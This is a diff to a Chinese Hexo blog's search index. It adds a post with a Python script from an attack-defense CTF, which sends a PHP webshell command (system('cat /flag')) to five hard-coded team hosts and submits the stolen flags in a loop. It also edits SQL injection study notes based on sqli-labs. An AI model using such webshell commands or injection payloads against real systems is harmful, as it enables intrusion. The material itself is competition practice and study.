@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title><![CDATA[python_exp]]></title>
+      <url>/2019/07/20/python-exp/</url>
+      <content type="html"><![CDATA[<h1 id="python-exp"><a href="#python-exp" class="headerlink" title="python-exp"></a>python-exp</h1><p>这是一个利用<code>php木马</code>获取flag的<code>python</code>exp脚本, 没啥技术含量, 就是挂在这里, 省的将来找不着了还得重新写, 这个文章也许会用来挂我写的exp??? 都没准, 看心情. 哈哈哈哈哈哈哈哈哈<br>哦对了, 评论系统在做了, 在做了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Start : %s"</span> %time.ctime())</span><br><span class="line">    <span class="comment"># ip 末位是3到7的6个队伍为目标</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">8</span>):</span><br><span class="line">        ip = <span class="string">"http://45.77.188.86:880"</span> + str(i) + <span class="string">"?aa=system('cat /flag');"</span></span><br><span class="line">        result = str(requests.get(ip).content,<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># 匹配flag的位置</span></span><br><span class="line">        length = len(<span class="string">'b9e448613a6cab059766405d6b5fa004&lt;!--'</span>)</span><br><span class="line">        postion = result.find(<span class="string">'banner'</span>) - length</span><br><span class="line">        flag = result[postion : postion+length]</span><br><span class="line">        print(flag)</span><br><span class="line">        url = <span class="string">"http://45.77.188.86:8080/flag_file.php?token=team2&amp;flag="</span> + flag</span><br><span class="line">        print(str(requests.get(url).content,<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="comment"># flag两分钟刷新一轮</span></span><br><span class="line">    time.sleep(<span class="number">120</span>)</span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> python网络编程 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[用python给女神刷赞会发生什么？]]></title>
       <url>/2019/07/19/%E5%BD%93%E4%BD%A0%E7%94%A8python%E7%BB%99%E5%A5%B3%E7%A5%9E%E5%88%B7%E8%B5%9E%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
       <content type="html"><![CDATA[<h1 id="用python给女神刷赞会发生什么？"><a href="#用python给女神刷赞会发生什么？" class="headerlink" title="用python给女神刷赞会发生什么？"></a>用python给女神刷赞会发生什么？</h1><a id="more"></a>
@@ -172,8 +187,18 @@
 <h3 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h3><p>用于连接两个以上的select语句的结果组合到一个结果集合中, 多个select语句会删除重复的数据. 例如</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select country from websites UNION select country from apps;</span><br><span class="line">+---------+</span><br><span class="line">| country |</span><br><span class="line">+---------+</span><br><span class="line">| CN      |</span><br><span class="line">| IND     | </span><br><span class="line">| USA     |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
 
-<h2 id="sqli-labs-冲冲冲"><a href="#sqli-labs-冲冲冲" class="headerlink" title="sqli-labs 冲冲冲"></a>sqli-labs 冲冲冲</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1|GET|Error based|Single quotes|String"></a>Less-1|GET|Error based|Single quotes|String</h3><p>select * from table where id=-1’ union select database() union select version();–+’ limit 0,1</p>
-]]></content>
+<h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><p>既然要刷题, 就得总结出套路来才有意义. 下面是我总结出的常用流程.</p>
+<ol>
+<li>判断是否存在注入<br>如果题目中会显示报错信息那么通常可以注入, 例如, 最简单的情况是输入<code>&#39;</code>显示报错信息, 那么这里就可能存在注入.</li>
+<li>判断注入类型</li>
+</ol>
+<ul>
+<li><p>变量的储存类型?<br>  因为mysql数据库保存的信息可能按数值或字符串保存, 比如1和’1’. 这会导致有很多区别. 比如如果是按数值存储, 那么<code>1-1</code>就等价于<code>0</code>,字符串储存就是<code>&#39;1-1&#39;</code>的这段文本.</p>
+</li>
+<li><p>变量的闭合方式?</p>
+</li>
+</ul>
+<h2 id="sqli-labs-冲冲冲"><a href="#sqli-labs-冲冲冲" class="headerlink" title="sqli-labs 冲冲冲"></a>sqli-labs 冲冲冲</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1|GET|Error based|Single quotes|String"></a>Less-1|GET|Error based|Single quotes|String</h3>]]></content>
       
         
         <tags>
@@ -646,11 +671,11 @@
         
         <tags>
             
+            <tag> python网络编程 </tag>
+            
             <tag> 服务器 </tag>
             
             <tag> ubuntu </tag>
-            
-            <tag> python网络编程 </tag>
             
         </tags>
         
